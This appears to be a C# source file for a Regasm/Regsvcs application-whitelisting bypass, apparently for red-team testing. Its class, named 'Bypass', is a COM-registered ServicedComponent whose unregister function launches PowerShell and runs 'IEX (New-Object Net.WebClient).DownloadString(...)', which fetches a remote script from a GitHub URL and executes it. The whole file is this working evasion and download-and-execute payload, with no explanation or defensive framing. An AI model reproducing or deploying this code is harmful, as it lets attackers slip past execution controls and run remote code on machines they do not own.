using System;
using System.EnterpriseServices;
// edit .csproj to add the dll
using System.Runtime.InteropServices;
using System.Management.Automation;
// edit .csproj to add the dll

namespace RegasmRegsvcs
{
    [ClassInterface(ClassInterfaceType.AutoDual)]
    [ComVisible(true)]
    public class Bypass : ServicedComponent
    {
        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
        [ComUnregisterFunction] //This executes if registration fails
        public static void UnRegisterClass(string key)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddCommand("Invoke-Expression");
            ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
            ps.Invoke();
        }
    }
}
